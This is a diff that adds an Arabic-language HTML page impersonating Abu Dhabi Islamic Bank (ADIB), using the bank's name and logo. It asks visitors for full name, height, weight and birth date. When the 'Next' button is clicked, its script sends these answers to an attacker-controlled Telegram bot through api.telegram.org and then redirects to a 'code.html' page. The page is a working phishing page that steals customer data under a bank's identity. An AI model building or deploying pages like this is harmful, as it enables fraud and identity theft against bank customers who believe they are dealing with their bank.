@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>مصرف أبوظبي الإسلامي</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      direction: rtl;
+      text-align: right;
+      background-color: #f9f9f9;
+      padding: 20px;
+    }
+
+    header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    header img {
+      width: 120px;
+    }
+
+    h2 {
+      color: #004c97;
+      text-align: center;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background-color: #004c97;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="adib.png" alt="شعار ADIB">
+  </header>
+
+  <h2>مصرف أبوظبي الإسلامي</h2>
+
+  <label>الاسم الكامل</label>
+  <input type="text" id="fullName">
+
+  <label>كم طولك؟ (سم)</label>
+  <input type="number" id="height">
+
+  <label>كم وزنك؟ (كجم)</label>
+  <input type="number" id="weight">
+
+  <label>تاريخ الميلاد</label>
+  <input type="date" id="birthDate">
+
+  <button onclick="sendCustomerInfo()">التالي</button>
+
+  <script>
+    const telegramBotToken = 'YOUR_BOT_TOKEN';
+    const chatId = 'YOUR_CHAT_ID';
+
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      fetch(url).catch(err => console.error("خطأ في إرسال تلغرام", err));
+    }
+
+    function sendCustomerInfo() {
+      const name = document.getElementById('fullName').value;
+      const height = document.getElementById('height').value;
+      const weight = document.getElementById('weight').value;
+      const birthDate = document.getElementById('birthDate').value;
+
+      const message = `
+👤 معلومات العميل - ADIB:
+الاسم الكامل: ${name}
+الطول: ${height} سم
+الوزن: ${weight} كجم
+تاريخ الميلاد: ${birthDate}
+      `;
+
+      sendToTelegram(message);
+      window.location.href = "code.html";
+    }
+  </script>
+
+</body>
+</html>
